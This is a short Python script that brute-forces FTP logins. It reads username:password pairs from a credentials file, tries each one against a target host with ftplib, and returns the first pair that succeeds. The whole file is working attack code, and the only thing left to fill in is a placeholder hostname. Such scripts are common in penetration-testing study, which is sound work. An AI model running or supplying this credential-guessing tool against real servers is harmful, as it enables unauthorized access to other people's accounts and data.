import ftplib


def bruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        userName = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: {}/{}".format(userName, password))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, password)
            print("FTP Login Succeeded: {}/{}".format(userName, password))
            ftp.quit()
            return (userName, password)
        except Exception:
            pass


if __name__ == "__main__":
    hostName = "123" # (isn't real ip of an FTP server)
    passwordFile = 'credentials.txt'
    bruteForceLogin(hostName, passwordFile)